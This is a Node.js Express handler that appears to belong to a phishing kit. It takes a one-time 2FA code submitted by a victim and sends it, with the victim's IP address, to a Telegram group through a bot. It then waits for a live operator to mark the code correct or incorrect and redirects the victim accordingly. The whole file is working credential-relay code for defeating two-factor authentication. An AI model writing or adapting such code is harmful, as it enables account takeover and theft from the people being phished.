const {bot, groupID} = require('../index');

const send2fa = async(req, res) => {
    const {twoFa} = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
              [
                { text: 'Верно', callback_data: 'correct' },
                { text: 'Не верно', callback_data: 'incorrect' }
              ]
            ]
          }
      };
    bot.sendMessage(groupID,
`IP заявки: ${ip}
Пароль для входа: ${twoFa}`,
 keyboard);
 bot.once('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
  
    if (data === 'correct') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Пароль верный, перенаправление на завершение`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('correct');
    }
    if (data === 'incorrect') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Пароль не верный, перенаправление на повторную форму`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('incorrect');
    }
});
}

module.exports = send2fa;